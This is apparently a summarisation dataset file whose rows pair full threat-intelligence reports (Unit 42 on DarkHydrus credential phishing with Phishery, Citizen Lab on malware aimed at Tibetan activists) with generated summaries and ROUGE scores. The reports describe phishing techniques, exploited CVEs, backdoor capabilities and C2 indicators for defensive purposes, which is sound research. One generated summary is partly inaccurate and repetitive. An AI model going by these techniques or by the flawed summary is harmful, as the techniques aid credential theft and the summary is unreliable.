SPIDER is the pioneer of targeted;en;{'r': 0.1413934426229508, 'p': 0.9324324324324325, 'f': 0.24555159913678903};{'r': 0.08954545454545454, 'p': 0.8565217391304348, 'f': 0.16213991598164237};{'r': 0.13934426229508196, 'p': 0.918918918918919, 'f': 0.24199288027557914}
https://unit42.paloaltonetworks.com/unit42-darkhydrus-uses-phishery-harvest-credentials-middle-east/;DarkHydrus Uses Phishery to Harvest Credentials in the Middle East;"This post is also available in: ??? (Japanese)Last week, Unit 42 released a blog on a newly named threat group called DarkHydrus that we observed targeting government entities in the Middle East. The attack that we discussed in our previous publication involved spear-phishing to deliver a PowerShell payload we call RogueRobin, however, we are aware of DarkHydrus carrying out a credential harvesting attack in June 2018. It also appears that this an ongoing campaign, as we have evidence of previous credential harvesting attempts using the same infrastructure dating back to the Fall of 2017. These attacks were targeting government entities and educational institutions in the Middle East.The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the ""attachedTemplate"" technique to load a template from a remote server. When attempting to load this remote template, Microsoft Office will display an authentication dialog box to ask the user to provide login credentials. When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials.Based on Unit 42's analysis, DarkHydrus used the open-source Phishery tool to create two of the known Word documents used in these credential harvesting attacks. As discussed in our previous blog, this further strengthens DarkHydrus' use of the open source for their attack tools.A phishing attack to steal credentials like this is not new: US-CERT warned of the same technique by a different threat group in 2017. What is noteworthy is DarkHydrus' use of an open-source tool to carry out targeted attacks against these entities in the Middle East, which is fitting of their reliance of open source tools and these attacks are consistent in terms of targeting with what we reported last week. Based on this, we can reasonably presume this group will continue to carry out attacks against these kinds of targets in the Middle East in the near-future.Credential Harvesting AttackOn June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East. The attack involved a spear-phishing email with a subject of ""Project Offer"" and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment. When opened, the malicious Word document displays a dialog box that asks the user for their credentials, as seen in Figure 1.Figure 1. Authentication dialog box presented to the user when opening documentAs you can see in Figure 1, the authentication prompt says ""Connecting to <redacted>. 0utl00k[.]net"", which is a DarkHydrus C2 server. If the user enters their credentials in this dialog box and presses 'Ok', the credentials are sent to the C2 server via the URL https://<redacted>.0utl00k[.]net/download/template.docx. With the authentication dialog box gone, Word displays the contents of the document, which in this specific case was an empty document. While this document was empty, the authentication prompt may have made the targeted user more likely to enter their credentials, thinking it's necessary to view the contents of the document.DarkHydrus also created their C2 domain carefully in an attempt to further trick the targeted user to enter their credentials. Firstly, the redacted subdomain was the domain of the targeted educational institution. Also, the 0utl00k[.]net domain resembles Microsoft's legitimate ""outlook.com"" domain that provides free email services, which also make the user less suspicious and more likely to enter their credentials. Some users may not even notice what domain the dialog states they are connecting to and habitually type their Windows credentials.We found two additional Word documents using the 0utl00k[.]net domain to harvest credentials, seen in Table 1. We first saw these related Word documents in September and November 2017, which suggests that DarkHydrus has been carrying out this credential harvesting campaign for almost a year.First Seen SHA256 Filename Remote Template 11/12/2017 9eac37a5c6.. PasswordHandoverForm.docx https://0utl00k[.]net/docs 09/18/2017 0b1d5e1744.. ???????.docx https://0utl00k[.]net/docsTable 1. Additional DarkHydrus Word documents used to steal credentialsBoth of these related documents use the attachedTemplate technique to steal credentials by sending them to a URL https://0utl00k[.]net/docs. Unlike the June 2018 document that displayed no content after credential theft, both of these documents displayed content that appears pertinent to the targeted organization. The September 2017 document displays an employee survey, which can be seen in Figure 2.Figure 2. Employee survey displayed after credential theftThe November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3. We were unable to find the displayed document via open source research, which may suggest that the actor gathered this password handover form from a prior operation.Figure 3. Password handover form displayed after credential theftThe infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150. This same infrastructure was discussed in the Campaign Analysis of our previous blog.Phishery ToolWhile analyzing the three malicious Word documents, we determined that two of the documents were created using an open source tool called Phishery. The Phishery tool is capable of the following:Creating malicious Word documents by injecting a remote template URL Hosting a C2 server to gather credentials entered into authentication dialog boxes displayed when attempting to obtain the remote templateWe were able to confirm that DarkHydrus used Phishery to create these Word documents by using the open source tool to create a document and host a C2 ourselves. The DarkHydrus document used in the June 2018 attacks had a remote template URL added, as seen in Figure 4.Figure 4. Remote template URL seen in the DarkHydrus document from June 2018We were able to replicate the remote template path seen in Figure 4 by using Phishery to create a weaponized delivery document. Figure 5 shows Phishery's output to the command that injects a URL into a file named ""good_test.docx"", which it will save the resulting file to ""bad_test.docx"".Figure 5. Phishery command used to create a document that has same remote template URL as DarkHydrusTo confirm, we used Phishery's C2 server and opened DarkHydrus' Word document from the June 2018 attacks. When presented with the authentication dialog box, we entered ""fakename"" and ""fakepass"" as credentials, as seen in Figure 6 and pressed enter.Figure 6. Authentication dialog box with fake credentials enteredOn the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7. The C2 server was able to obtain the ""fakename"" and ""fakepass"" credentials entered into the authentication dialog box displayed when opening DarkHydrus' Word document.Figure 7. Output of Phishery C2 showing captured credentialsConclusionDarkHydrus is a threat group carrying out attack campaigns targeting organizations in the Middle East. We discovered DarkHydrus carrying out credential harvesting attacks that use weaponized Word documents, which they delivered via spear-phishing emails to entities within government and educational institutions. This threat group not only used the Phishery tool to create these malicious Word documents, but also to host the C2 server to harvest credentials. The use of Phishery further shows Dark Hydrus' reliance on open source tools to conduct their operations.Palo Alto Networks customers are protected from Dark Hydrus by:The C2 server 0utl00k[.]net is classified as Malwareis classified as Malware All Phishery documents created by DarkHydrus have malicious verdicts in WildFireAutoFocus customers can monitor this threat group's activity via the DarkHydrus tagIndicators of CompromiseSamplesd393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff6453189eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf490b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82Infrastructure0utl00k[.]net107.175.150[.]113195.154.41[.]150";"DarkHydrus has been observed carrying out a credential harvesting attack against an educational institution in the Middle East. The attack involved a spearphishing email with a subject of ""Project Offer"" and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment. When opened, the malicious Word document displays a dialog box that asks the user for their credentials, as seen in Figure 1. If the user enters their credentials in this dialog box and presses 'Ok', the credentials are sent to the C2 server via the URL https://<redacted>.0utl00k[.]net/download/template.docx. With the authentication prompt gone, Word displays the contents of the document, which in this specific case was an empty document. While this document was empty, the authentication prompt may have made the targeted user more likely to enter their credentials, thinking it's necessary to view the contents of the document. DarkHydrus also created their C2 domain carefully in an attempt to further trick the targeted user to enter their credentials. DarkHydrus has been carrying out a credential harvesting campaign for almost a year, using the 0utl00k[. ]net domain to trick users into entering their credentials. Firstly, the redacted subdomain was the domain of the targeted educational institution. Also, the 0utl00k[. ]net domain resembles Microsoft's legitimate ""outlook.com"" domain that provides free email services, which also make the user less suspicious and more likely to enter their credentials.";en;{'r': 0.26773455377574373, 'p': 0.975, 'f': 0.42010771654767626};{'r': 0.18487394957983194, 'p': 0.9166666666666666, 'f': 0.3076923048990171};{'r': 0.2654462242562929, 'p': 0.9666666666666667, 'f': 0.4165170522747858}
https://citizenlab.ca/2018/08/familiar-feeling-a-malware-campaign-targeting-the-tibetan-diaspora-resurfaces/;Familiar Feeling A Malware Campaign Targeting the Tibetan Diaspora Resurfaces;"Key FindingsThis report analyzes a malware campaign active between January to March 2018 that targeted Tibetan activists, journalists, members of the Tibetan Parliament in exile, and the Central Tibetan Administration.We detail a successful intrusion of a Tibetan NGO and provide a brief analysis of the operator's actions post-infection.This recent campaign, as well as a campaign we reported in 2016, both have connections to a wider operation called ""Tropic Trooper"". The strength and meaning of these connections is assessed.We examine the challenges associated with investigating closed espionage ecosystems and the importance of accurately describing the players and the harms they cause.IntroductionIn January 2018, a Tibetan activist received a mundane-looking email purporting to be program updates from a human rights NGO. Attached to the message were a PowerPoint presentation and a document. The activist, like many in the Tibetan diaspora, had grown wary of unsolicited emails with attachments, and instead of opening the documents, shared the files with Citizen Lab researchers.The suspicion was warranted: the attachments were malicious. If clicked, the files would run recent exploits to infect Windows computers with custom malware. This email was the start of a malware campaign active between January to March 2018 that targeted Tibetan activists, journalists, members of the Tibetan Parliament in exile, and the Central Tibetan Administration. We worked closely with the targeted groups to collect the malicious messages, and also engaged in incident response with a compromised organization. This collaboration enabled us to gain further insights into the tactics, techniques, and procedures used by the operators.The campaign used social engineering to trick targets into opening exploit-laden PowerPoint (CVE-2017-0199) and Microsoft Rich Text Format (RTF) documents (CVE-2017-11882) attached to e-mail messages. The malware includes a PowerShell payload we call DMShell++, a backdoor known as TSSL, and a post-compromise tool we call DSNGInstaller.We call this recent campaign the ""Resurfaced Campaign"" because of connections to a 2016 campaign that targeted Tibetan Parliamentarians (which we refer to as the ""Parliamentary Campaign""). These connections suggest that the same group may be involved or tools and infrastructure are being shared between multiple groups.Tibetan Diaspora: A Highly Targeted CommunityThe threat of digital espionage has become a persistent reality for the Tibetan diaspora, which has been targeted by malware campaigns for over a decade. Historically, these operations have relied heavily on malicious attachments that leverage known exploits and basic Remote Access Trojans (RATs). This tactic may reflect a basic risk-reward calculation when targeting under-resourced civil society groups: if they are using unpatched systems, why run the risk of exposing more sophisticated technical tools when simple ones will do? The operators instead appear to focus much of their innovation on clever social engineering paired with a ""just enough"" approach to tooling. The limited technical innovation that we observe may be driven by the pragmatic need to continue to achieve access and permanence, rather than more sophisticated goals such as obscuring malware authorship or resisting decompiling.Shifting Tactics?Since 2016, the number of reported targeted malware campaigns against Tibetan groups has dropped significantly. In place of targeted malware, we have observed a shift to phishing designed to harvest credentials from online accounts. A notable exception to this change is the Parliamentary Campaign, which used known and patched exploits to deliver custom malware called KeyBoy. The Resurfaced Campaign is the first targeted malware activity against the Tibetan community we have observed since the Parliamentary Campaign.Familiar ConnectionsThe Resurfaced Campaign used different exploits and payloads than the Parliamentary Campaign but shares other connections. The two campaigns used similar spear phishing messages and both targeted Tibetan parliamentarians. One of the e-mail addresses used to send spear phishing messages in the Resurfaced Campaign ( tibetanparliarnent[@]yahoo.com ) was also used repeatedly during the Parliamentary Campaign.Based on the use of common tools and code similarities, both campaigns are also connected to a wider operation called ""Tropic Trooper"" that has been active since at least 2012 and was first reported by Trend Micro in 2015. Tropic Trooper has targeted governments and companies in Taiwan and the Philippines and is usually identified through the use of specific malware including Yahaoyah, Yahamam, and TSSL. The Resurfaced Campaign is linked to Tropic Trooper through its use of TSSL. The Parliamentary Campaign is linked through code similarities between Keyboy and Yahaoyah. Trend Micro noted Yahoyah shared the same algorithm for encoding configuration files as versions of KeyBoy found in 2013.If the same threat actor is behind the Resurfaced and Parliamentary Campaigns, the operators appear to have engaged in limited and incremental changes to their tools. Nevertheless, these improvements are minor, and are unlikely to represent significant costs. The exploit code and PowerShell code used in the campaign were publicly available. Proofs of concept of the exploits exist on Github, and DMShell++ (the PowerShell payload) is based on example code posted online.Closed Espionage Ecosystems: An analytical challengeThese types of campaigns use custom built malware that originate from a closed espionage ecosystem in which the parties involved (e.g., developers who write the malware, operators who conduct the campaigns, and intelligence customers who incentivize the activity) are difficult to identify and fully segment. Intelligence customers may be actively managing the development of tools and selection of targets or may be passive consumers who the operators know are interested in and will pay for information from certain targets. The cost and effort put into closed espionage ecosystems is harder to quantify than commoditized malware kits (such as cybercrime tools repurposed for espionage) or government exclusive malware (such as products from NSO Group) which have defined prices and markets.""Actors"" in closed espionage ecosystems are abstractions typically identified by the use of common tools and infrastructure. This level of attribution can help cluster incidents together into recognizable patterns and indicators. However, many burglars can, at different times, use the same crowbar. For example, seemingly disparate campaigns and threat actors may be linked through what FireEye describes as a ""digital quartermaster"", which refers to a resource of malware development and infrastructure that is shared amongst multiple campaigns and groups. Knowing what tools and tactics are leveraged in malware campaigns can provide insight into technical capabilities and allow an analyst to track activities over time, but this knowledge alone does not explain how information collected by the operators is ultimately used by the intelligence customer nor the types of harm that can follow for civil society.This report is organized into the following sections:Part 1: Resurfaced Campaign describes the Resurfaced Campaign that targeted Tibetan groups between January and March 2018.Part 2: Investigating a Compromise describes a compromise of a Tibetan NGO and analyzes operator actions post-infection.Part 3: Familiar Connections highlights connections between the Parliamentary and Resurfaced Campaigns to an operation called ""Tropic Trooper"".Part 4: Closed Espionage Ecosystems and Identifying Harm discusses challenges in analyzing closed espionage ecosystems and situates our investigation within wider trends of digital espionage operations against the Tibetan diaspora.Part 1: Resurfaced CampaignThis section describes the Resurfaced Campaign that targeted Tibetan groups between January and March 2018.Campaign OverviewWe observed the Resurfaced Campaign from January 16 to March 2, 2018 and collected seven spear phishing emails sent to Tibetan activists, journalists, members of the Tibetan Parliament in exile, and the Central Tibetan Administration (CTA).The messages were sent from email addresses that mimicked staff of Tibetan NGOs or the CTA, and shared content on advocacy activities, cultural events, and administrative announcements. We verified that some of this information was publicly available on social media, whereas other information may have been collected from public correspondence or private messages that could have been previously stolen by the operators. A January 22 spear phishing email was sent from tibetanparliarnent[@]yahoo.com , which was also used to send multiple spear phishing emails in the Parliamentary Campaign (see Figure 1).Figure 1: Spear phishing email sent on January 22 2018 that reuses an email address that was used in the 2016 Parliamentary Campaign.While both the Parliamentary Campaign and the Resurfaced Campaign used similar social engineering tactics and a common email address to send spear phishing messages, the Resurfaced campaign used a different, newer malware toolkit. In six of the eight intrusion attempts, the operator sent a Microsoft PowerPoint file exploiting a vulnerability disclosed in 2017 (CVE-2017-0199) designed to drop a payload written in Microsoft's PowerShell scripting language from a remote server. In two early intrusions attempts in January 2018, the operator also used an exploit for RTF documents (CVE-2017-11882).Figure 2 provides a timeline of the Resurfaced Campaign highlighting when spear phishing emails were sent and the exploits that were used.Figure 2: Timeline of spear phishing emails sent in the Resurfaced Campaign.Infection Chain: CVE-2017-0199 and DMShell++The most common infection chain in the campaign was the use of a PowerPoint Open XML Slide Show file (PPSX) exploiting CVE-2017-0199 to load a remote payload we call DMShell++, a basic TCP reverse shell written in Microsoft's PowerShell scripting language. We observed a very similar, albeit more simple, implementation of DMShell++ on a public posting on Wooyun (a Chinese hacker forum1) by an author with the username ""DM_"". We refer to the version discovered in our investigation as ""DMShell++"" in reference to the Wooyun username combined with the fact that the Wooyun version has been incrementally updated with additional basic commands.We observed versions of DMShell++ hosted on the domains enumerated in Table 1. However, we did not monitor these domains continuously and therefore it is possible that the operator may have used additional configurations not listed in the table.Date Observed Source C2 Configuration January 18, 2018 commail[.]co:5453/qqqzqa 27.126.186.222:6001 27.126.186.222:6002 27.126.186.222:6003 January 22, 2018 tibetnews[.]info:8026/qqqzqa 103.55.24.196:80 103.55.24.196:443 45.127.97.222:443 February 2, 2018 commail[.]co:5453/qqqzqa 27.126.186.222:80 27.126.186.222:443 27.126.186.222:8080 March 6, 2018 comemails[.]email:1234/hgf 203.189.232.207:80 203.189.232.207:443 103.55.24.196:443 Table 1: List of C2 configurations observed in different DMShell++ samplesThe versions of DMShell++ we observed had the same capabilities but different configurations for command and control. Table 2 provides an overview of capabilities of DMShell++ and how it could be used by an operator (technical details are included in Appendix A). This basic script gives the remote actor vast control over the victim computer. Initially deploying generic payloads hides true capabilities and intentions from defenders should the attempted intrusion be detected at this stage.Capability Purpose to the Operator Collect system information Internal IP addressOperating system (OS) versionUser name Collecting system information helps the operator assess if they have the correct target and learn about potential weaknesses in the computer's OS. Execute remote commands Executing remote commands provides additional reconnaissance information that can help the operator determine their next steps. Send additional files The ability to send additional files means the operator can download additional tools with different capabilities. Extract data Stealing files from the target machine is likely the operator's ultimate goal. Table 2: Overview of DMShell++ capabilitiesInfection Chain: CVE-2017-11882 and DMShell++In two spear phishing emails sent early in the campaign, the operator used a second exploit document in addition to the PPSX files described previously to deploy DMShell++. It is unclear why the operator used this secondary method. However, given the amount of time between patches being released for both vulnerabilities, as well as the different methods being used to execute the PowerShell payload, it is possible the operator wanted to maximize success while testing both exploitation methods.The second document was a RTF document designed to exploit CVE-2017-11882. In this case, instead of loading the PowerShell script from a remote location, this exploit document followed a more traditional infection chain by attempting to write an executable (EXE) program to the target computer. The EXE program was designed to create a small PowerShell script on the target computer to decode and execute an encoded version of DMShell++. This version of DMShell++ was configured to use the same C2 infrastructure as the remote version downloaded by the PPSX file sent in the same spear phishing email ( 27.126.186[.]222 on ports 6001 , 6002, and 6003 , Appendix D provides a detailed overview of the server infrastructure). Figure 3 shows an overview of the CVE 2017-11822 and DMShell++ infection chain.Figure 3: CVE-2017-11882 and DMShell++ Infection Chain.Infection Chain: CVE-2017-11882 and TSSL SuiteIn the spear phishing email sent on January 23 2018, the operator also included a RTF document designed to exploit CVE-2017-11882 and execute a payload embedded in the file. However, in this instance, the operator deployed an entirely different set of tools.As we analyzed the files written to disk as part of this infection chain, we observed multiple program database (PDB) strings. When available, PDB strings can be indicative of the malware creator's environment and namings for the developed malware.D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdbD:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdbThese PDB strings are consistent with a set of tools known as TSSL, which were previously described by Trend Micro and PwC and linked to KeyBoy and Tropic Trooper campaigns. The TSSL suite analysed in these reports includes a loader called FakeRun and a backdoor named TClient. While the samples we analyzed have a few differences from previously reported instances (e.g., version numbers, storage of configuration data, method for launching payloads) we conclude that they are likely based on the same source code (see Appendix B for a detailed comparative analysis of the samples). Figure 4 shows an overview of the CVE 2017-11882 and TSSL suite infection chain.Figure 4: CVE-2017-11882 and TSSL Suite Infection Chain.Part 2: Investigating a CompromiseThis section describes a compromise of a Tibetan NGO and analyzes operator actions post-infection.The fourth spear phishing email of the campaign was sent on January 23, 2018 to a range of targets working for Tibetan NGOs, media groups, and the CTA. The message appeared to be sent from the Director of the Tibet Museum, which is an official museum of the CTA. Attached to the email were RTF and PPSX messages that claimed to present information about the National Museum of Tibet (see Figure 5). These files contained the CVE-2017-11882 and TSSL Suite infection chain.Figure 5: Spear phishing email sent to Tibetan activists.One NGO in particular was heavily targeted and had multiple staff members receive the email. A senior staff member of the group opened the attachment from a computer in their office and was compromised. Through incident response on the organization's network, we observed post-infection actions taken by the operator and identified the use of a second backdoor.Network logs show connections to the IP address 115.126.86[.]151 on ports 6001 , 8080 , and 8100 matching the configuration file of the TSSL implant. This backdoor was configured to communicate with the C2 server every 20 minutes, but we quickly noticed during the analysis of networks logs that most connections were actually rejected by the C2 server. Based on these patterns, it appears the C2 server was disabled most of the day and active only for short windows.The TClient sample was used until January 29 when a new backdoor was deployed on the infected system communicating with a new C2 server listed in Table 3. We call the new backdoor ""DSNGInstaller"", a name stemming from the payload's internal name combined with the irony that DSNG is an accepted acronym for Digital Satellite News Gathering. Both backdoors were active until February 8 when the TClient sample was removed.Sample MD5 Domain IP DSNGInstaller 67e866c461c285853b225d2b2c850c4f tibetfrum[.]info 27.126.176.169 Table 3: C2 configuration for the DSNGInstaller backdoorTable 4 provides an overview of DSNGInstaller's capabilities (technical details are included in Appendix C). These features are similar to those provided by TClient.Capability Purpose to the Operator System Reconnaissance List all volumes and drivesList running processesList files Additional reconnaissance information helps the operator determine their next action. File System Access Create a file or directoryDelete a file or directory Interacting with the file system allows the operator to use new tools and hide evidence of their actions. System Control Run a process with outputRun a process without outputStop currently running processes Running processes allows the operator to run their tools while stopping processes allows the operator to shutdown programs that may detect their actions. Data exfiltration Upload a file to the C2 server Stealing files from the target machine is the ultimate goal of the operator. Table 4: Capabilities of the DSNGInstaller backdoorWhile it is unclear why the operator switched malware after multiple days of undetected success, we consider potential scenarios. It is possible the TSSL malware was detected by other targets where we do not have visibility, which caused the operator to shift to a lesser known tool with a lower detection rate. Another possible scenario is that the operator's interface to the DSNGInstaller tool is more robust and thus preferable for expected long-term access. Finally, it is possible that DSNGIntaller is the tool of choice of another operator. This last scenario would represent a potential handoff of a surveillance victim between multiple remote operators.Part 3: Familiar ConnectionsThis section highlights connections between the Parliamentary and Resurfaced campaigns to an operation called ""Tropic Trooper.""Campaign ConnectionsThe tactics, techniques, and procedures used in the Resurfaced Campaign link it to the Parliamentary Campaign and to an operation called ""Tropic Trooper"".Trend Micro released the first public report on Tropic Trooper in 2015, describing a malware campaign that targeted government institutions, military agencies, and companies in Taiwan and the Philippines. The campaign exploited old vulnerabilities (CVE-2010-3333 and CVE-2012-0158) and used custom malware, which Trend Micro detects as TROJ_YAHOYAH and BKDR_YAHAMAM. Trend Micro noted that the Yahoyah malware used the same algorithm for encoding configuration files as the 2013 versions of KeyBoy analyzed by Rapid7, suggesting a link between these campaigns or at least the developers of the malware.The KeyBoy samples that were used in the 2016 Parliamentary Campaign had a significant change in the encoding of the configuration file compared to the samples described by Rapid7. In the 2013 version, the configuration file was encoded using a simplified static-key based algorithm. The newer encoding algorithm removed the use of a static encryption key in favour of a dynamically constructed lookup table. The main connection between the Resurfaced Campaign and the Parliamentary Campaign is the reuse of a Yahoo email address ( Tibetanparliarnent[@]yahoo.com ) to send spear phishing emails to targets in the Tibetan community.Most recently, in 2018 Trend Micro published an update on Tropic Trooper noting a new infection chain that included different exploits (CVE-2017-11882, CVE-2018-0802) and the TSSL tool suite. Amongst the C2 servers observed was a domain ( tibetnews[.]today ), which shares registrant information with the domains used in the Resurfaced campaign.Figure 6 provides an overview of the connections between these campaigns.Figure 6: Connections between Resurfaced, Parliamentary, and Tropic Trooper campaigns.Evaluating ConnectionsThe relationships between campaigns is typically drawn through the use of common technical indicators (e.g., malware, server infrastructure, etc). In some cases, these links are used to connect multiple campaigns to a ""threat actor"" or ""group"" which is thought to be carrying out the campaigns. These links can have varying levels of strength, which can lead to different levels of confidence in attributing campaigns to a specific actor (see Table 5).Connection Type Description First-order connections Shared tools and infrastructure that are directly observed being used against targets. These connections typically form the core indicators or ""problem set"" of a campaign. Second-order connections Related samples of tools believed to be unique or C2 infrastructure overlaps where neither the tools or infrastructure were directly observed in use. Nth-order connections Unique characteristics of tools and infrastructure such as code reuse, development techniques, or naming conventions. Table 5: Overview of connection types and level of confidence.First-order connections typically require direct observation of malicious activity against a target and as a result may not be made public (for example, if a security company obtains the data from a customer). By contrast, second and Nth-order connections can usually be normalized between researchers and used to make connections between campaigns. For example, Kaspersky labelled a reportedly China-based threat group as Winnti after a tool they used. Over time, different campaigns and tools were grouped under the same name, for instance, Microsoft associated Winnti with multiple groups they name ""BARIUM"" and ""LEAD"". While these differences in groupings stem from differing first-order connections, enough second and Nth-order connections have been identified to reference the collection of indicators as an umbrella of ""Winnti"" activities, which ProtectWise recently did in a report. In these cases, indicators are available, but the strength of the connections may not be readily apparent and can lead to very wide groupings and abstractions.For Tropic Trooper, multiple security companies have released information that they claim link campaigns to the threat actor. The strength of the evidence behind these claims is not always clear but the majority appear to be second and/or Nth-order connections. Table 6 and Figure 7 detail the connections made in these reports.Report Description Tropic Trooper Connection Connection Type Palo Alto (2016) Campaign using Yahoyah, PcShare, and Poison Ivy targeting Taiwanese government and fossil fuel provider Use of Yahoyah malwareOverlapping C2 infrastructure Second-order, possibly first-order Lookout (2017) Description of Android malware called Titan Overlapping C2 infrastructure Second-order Trend Micro (2018) Campaign using TSSL toolkit targeting government and industry in Taiwan, Philippines, and Hong Kong. TSSL toolkit Unknown* Table 6: Overview of reports connecting malware campaigns to Tropic Trooper *Note: This report is the first time TSSL toolkit is linked to Tropic Trooper. Trend Micro does not explain how they made the connection.Figure 7: Connections between reports linking campaigns and malware to Tropic Trooper.Part 4: Challenges of Analyzing Closed EcosystemsThis section discusses challenges in investigating closed espionage ecosystems and situates our investigation within wider trends of digital espionage operations against the Tibetan diaspora.The Resurfaced Campaign used a mix of new and previously-observed tools, which share technical characteristics with campaigns previously attributed to Tropic Trooper. However, these links alone do not allow us to conclusively state that the campaigns are run by the same actor. This ambiguity illustrates some of the analytical challenges posed when analyzing connections between campaigns and theorizing about the roles of different actors in closed espionage ecosystems.Researchers need to use naming schemes and actor grouping to characterize digital espionage operations out of necessity. While names are critical, the process by which they are selected, as Florian Roth and others have pointed out, can lead to to multiple names for the same group and potential confusion over what a name refers to. Differentiating between campaigns and the ""threat actor"" behind Tropic Trooper shows some of these challenges. Reports on Tropic Trooper have characterized it in varied and sometimes ambiguous ways (see Table 7). This variation points to some of the challenges inherent in consistently using naming: do names refer to campaigns of malware activity, the ""threat actors"" behind them, or a common tool set? It is not always clear.Report Description Trend Micro (2015) ""'...Operation Tropic Trooper,' an ongoing campaign..."" Palo Alto (2016) ""...a campaign called Tropic Trooper,..."" Lookout (2017) ""...linked to the same actors behind Operation Tropic Trooper. Tropic Trooper is a long running campaign..."" Trend Micro (2018) ""Tropic Trooper (also known as KeyBoy) levels its campaigns against ... targets"" Table 7: Descriptions of Tropic Trooper in previous reports.Part of the complexity of naming stems from the multiple operational roles likely to be present in a major campaign. These roles may include malware developers, campaign operators, and intelligence taskers and consumers. The relationships between these roles may be simple or multi-layered. For example, a developer may double as an operator for a small task for a customer. Malware developers may share tools with multiple operators acting independently from each other. Customers may be active (i.e., directly involved in tasking operators) or passive (i.e., consuming information brought to them by the operators or brokers representing the operators). Unfortunately, in the case of the Resurfaced Campaign, we lack the visibility into the organizational roles that would help us move from what we have observed to a more conclusive statement about its relationship to Tropic Trooper. Meanwhile, an operator may use the same tools to work on multiple tasks for multiple consumers. These complexities can create challenges when tools and infrastructure are the primary means for identifying and linking campaign activities.Reviewing the timeline of malware and infrastructure development in the Resurfaced Campaign illustrates these challenges. Figure 8 shows that while the infrastructure was setup months before the first spear phishing messages were sent, the malware builds were all done shortly before the campaign started. The time difference between infrastructure setup and malware build combined with the fact that our identified connections to Tropic Trooper are only code-based suggest that the malware may be a resource that is shared between groups.Figure 8: Resurfaced Campaign Malware and Infrastructure Development Timeline.The connections between the Resurfaced and Parliamentary Campaigns to Tropic Trooper highlight the difficulties of characterizing threat groups and how they interact with other players in a closed espionage ecosystem. While the campaigns are linked by shared tools and infrastructure (Nth-order connections), based on this information alone we cannot conclusively say that these activities are being conducted by a single group. Campaigns labelled as Tropic Trooper also have targeted a range of government, industry, and civil society targets, which may indicate multiple intelligence consumers.A View into Closed Espionage EcosystemsAlthough the relationship between developers, operators, and the final intelligence consumer is often unclear, recent indictments issued by the United States Department of Justice (DOJ) against espionage groups based in China provide a glimpse into how these groups interact.In 2014, the DOJ charged five officers of the People's Liberation Army with economic espionage offences. These officers are allegedly part of a threat group known as APT1, which Mandiant first identified as part of the 2nd Bureau of the People's Liberation Army General Staff Department's 3rd Department. APT1 targeted numerous government and Fortune 500 companies, but was also found by Citizen Lab to have targeted Tibetan activists and a large international NGO. According to the indictment, the intelligence consumers that APT1 serviced included the Chinese government and Chinese firms seeking intellectual property and information on competitors.In another 2014 case, the DOJ charged a Chinese national named Su Bin with participating in a long term conspiracy to compromise major U.S. defense contractors and sell stolen information on technology projects to entities in China. Su Bin worked with two unnamed conspirators who carried out the the intrusions. The indictment identified the conspirators as being located in China and related to ""multiple organizations and entities in the PRC"". The conspirators received 2.2 million RMB (approximately $332,040 USD) to build up their operation, but the total cost of the activity was 6.8 million RMB (approximately $995,400 USD). The conspirators shared a report with each other that detailed targets, objectives, and successes of an intrusion operation against one of their targets. The report included a description of ""past achievements"" including stealing files from the ""democracy movement"" (a reference to democracy activists in Hong Kong) and the ""Tibetan independence movement"".These cases offer rare glimpses into the interactions between developers, operators, and intelligence consumers showing that the same million-dollar programs funded to conduct economic espionage operations may also incentivize the targeting of civil society organizations. While the first type of operation may result in loss of intellectual property and financial loss, the second might result in direct harm to targeted individuals or their families.Addressing the analytical challengesSecurity researchers typically do not have the level of evidence and visibility cited in the DOJ indictments and have to rely on available technical indicators to track groups and hypothesize their motivations and role within closed espionage ecosystems. A possible area for future work is using formal methods (i.e., mathematical techniques developed in computer science to describe properties of hardware and software systems) to connect technical indicators and link campaigns. Such techniques may provide a more systematic way to link groups together and alleviate ambiguity. However, as we have discussed, identification of operators and malware developers is only one piece of the puzzle. Gaining an understanding of the ultimate harm of digital espionage requires interacting with targeted communities.Showing Harm: Perspectives from Civil SocietyDigital espionage has become a commonplace threat for the Tibetan diaspora. Digital security awareness and best practices for defense are now necessities for the community. Based on this experience, for Tibetans the harm of espionage operations is clear. Lobsang Gyatso Sither, a Tibetan digital security trainer, provides a perspective:""It's important for the community to get away from the mindset of ""I have nothing to hide"" and think about the connections between us and how these can lead to harm. Tibetans in Exile are connected to each other through various organizations and contacts. If you are compromised, you become the weakest link, and allow the spies to get information that can be used to target other Tibetans. Tibetans in Exile are also constantly in touch with Tibetans inside Tibet, where the harms can be severe - including arrest, detention, and imprisonment.""In recent years, we have seen oper";"The report provides an overview of the ITSecurity report. The Tibetan NGO was heavily targeted and had multiple staff members receive the email. A senior staff member of the group opened the attachment from a computer in their office and was compromised. Through incident response on the organization's network, we observed postinfection actions taken by the operator and identified the use of a second backdoor. Network logs show connections to the IP address 115.126.86[. ]151 on ports 6001 , 8080 , and 8100 matching the configuration file of the TSSL implant. The tactics, techniques, and procedures used in the Resurfaced Campaign link it to the Parliamentary Campaign and to an operation called ""Tropic Trooper"". Trend Micro released the first public report on Tropic Trooper in 2015, describing a malware campaign that targeted government institutions, military agencies, and companies in Taiwan and the Philippines. The campaign exploited old vulnerabilities (CVE20103333 and CVE20120158) and used custom malware, which Trend Micro detects as TROJ_YAHOYAH and BKDR_YAHAMAM. Trend Micro noted that the Yahoyah malware used the same algorithm for encoding configuration files as the 2013 versions of KeyBoy analyzed by Rapid7, suggesting a link between these campaigns or at least the developers of the malware. The KeyBoy samples that were used in the 2016 Parliamentary Campaign had a significant change in the encoding of the configuration file compared to the samples described by Rapid7, suggesting a link between these campaigns or at least the developers of the malware";en;{'r': 0.09133024487094639, 'p': 